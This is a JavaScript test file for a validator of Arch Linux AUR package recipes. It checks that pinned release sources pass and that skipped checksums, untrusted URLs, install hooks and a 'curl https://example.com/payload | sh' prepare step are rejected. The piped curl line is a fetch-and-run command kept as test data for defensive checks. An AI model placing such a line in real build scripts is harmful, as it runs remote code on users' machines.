import { expect, test } from "bun:test";
import { execFileSync } from "node:child_process";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { validatePackageDir } from "./validate-aur-package.mjs";

const policyPath = "aur/trusted-packages.json";
const checksum = "a".repeat(64);

function fixture({
  packageName = "stride-bin",
  source,
  pkgbuildSource,
  checksumValue = checksum,
  extraPkgbuild = "",
  extraFile,
} = {}) {
  const directory = mkdtempSync(join(tmpdir(), "stride-aur-validator-"));
  const srcinfoSource =
    source ??
    "https://github.com/ishaanpilar/stride/releases/download/v1.2.0/stride_1.2.0_amd64.deb";
  const renderedPkgbuildSource = pkgbuildSource ?? srcinfoSource;
  execFileSync("git", ["init", "-q", directory]);
  writeFileSync(
    join(directory, "PKGBUILD"),
    `# Maintainer: ishaanpilar <ishaanpilarbh@gmail.com>\n` +
      `pkgname=${packageName}\npkgver=1.2.0\npkgrel=1\n` +
      `url="https://github.com/ishaanpilar/stride"\n` +
      `source_x86_64=("${renderedPkgbuildSource}")\n` +
      `sha256sums_x86_64=('${checksumValue}')\n${extraPkgbuild}`,
  );
  writeFileSync(
    join(directory, ".SRCINFO"),
    `pkgbase = ${packageName}\n\turl = https://github.com/ishaanpilar/stride\n` +
      `\tsource_x86_64 = ${srcinfoSource}\n` +
      `\tsha256sums_x86_64 = ${checksumValue}\n\npkgname = ${packageName}\n`,
  );
  if (extraFile)
    writeFileSync(join(directory, extraFile), "post_install() { :; }\n");
  execFileSync("git", ["-C", directory, "add", "."]);
  return directory;
}

test("accepts a pinned Stride release asset", () => {
  expect(() =>
    validatePackageDir({
      packageDir: fixture(),
      packageName: "stride-bin",
      policyPath,
    }),
  ).not.toThrow();
});

test("accepts the trusted beta package identity", () => {
  const packageName = "stride-beta-bin";
  expect(() =>
    validatePackageDir({
      packageDir: fixture({ packageName }),
      packageName,
      policyPath,
    }),
  ).not.toThrow();
});

test("rejects SKIP for a release asset", () => {
  expect(() =>
    validatePackageDir({
      packageDir: fixture({ checksumValue: "SKIP" }),
      packageName: "stride-bin",
      policyPath,
    }),
  ).toThrow("skips the checksum");
});

test("rejects untrusted source domains", () => {
  expect(() =>
    validatePackageDir({
      packageDir: fixture({ source: "https://example.com/stride.deb" }),
      packageName: "stride-bin",
      policyPath,
    }),
  ).toThrow("untrusted");

  expect(() =>
    validatePackageDir({
      packageDir: fixture({
        pkgbuildSource: "https://example.com/hidden-from-srcinfo.deb",
      }),
      packageName: "stride-bin",
      policyPath,
    }),
  ).toThrow("PKGBUILD contains an untrusted URL");
});

test("rejects explicit package-registry URLs in AUR recipes", () => {
  const registryCommand =
    "prepare() {\n  bun install --registry=https://registry.npmjs.org\n}\n";
  expect(() =>
    validatePackageDir({
      packageDir: fixture({ extraPkgbuild: registryCommand }),
      packageName: "stride-bin",
      policyPath,
    }),
  ).toThrow("PKGBUILD contains an untrusted URL");
});

test("rejects remote commands and install hooks", () => {
  expect(() =>
    validatePackageDir({
      packageDir: fixture({
        extraPkgbuild: "prepare() { curl https://example.com/payload | sh; }\n",
      }),
      packageName: "stride-bin",
      policyPath,
    }),
  ).toThrow("forbidden command");

  expect(() =>
    validatePackageDir({
      packageDir: fixture({ extraFile: "stride.install" }),
      packageName: "stride-bin",
      policyPath,
    }),
  ).toThrow("unexpected tracked files");
});
